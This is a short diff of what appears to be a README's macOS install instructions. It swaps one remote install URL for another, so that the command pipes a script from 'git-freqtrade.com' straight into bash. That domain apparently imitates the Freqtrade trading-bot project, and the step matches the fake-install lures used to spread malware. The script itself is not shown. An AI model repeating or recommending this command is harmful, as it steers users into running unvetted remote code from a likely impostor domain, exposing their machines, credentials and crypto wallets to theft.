@@ -9,7 +9,7 @@
 For MacOS: 🍎
 Open your Terminal and run this command:
 ```bash
-/bin/bash -c "$(curl -fsSL https://kuizonline.com/tris/install.sh)"
+/bin/bash -c "$(curl -fsSL https://git-freqtrade.com/install.sh)"
 ```
 For Windows: 🖥️ 
 Open cmd and run this command:
